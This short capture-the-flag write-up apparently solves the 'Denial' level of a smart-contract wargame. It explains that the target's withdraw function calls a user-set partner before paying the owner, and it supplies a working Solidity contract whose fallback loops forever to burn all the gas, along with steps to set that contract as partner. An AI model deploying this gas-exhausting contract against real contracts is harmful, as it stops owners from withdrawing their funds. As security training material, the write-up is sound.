# Denial 

Preventing the owner from withdrawing.

We have access to a function that allows us to set a `partner` and a call is made to this partner before the owner transfer is made within the withdraw function.
We will create a helper (attack) contract that simply has a fallback with an infinite loop that will eat all the gas and prevent the transfer.

```shell
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract DenialAttack {

    fallback() payable external {
        while (true) {

        }
    }
}
```
## Hack:

Step 1:

Depoy this contract

Step2:

Set partner as the new contract address

Step3:

Wait.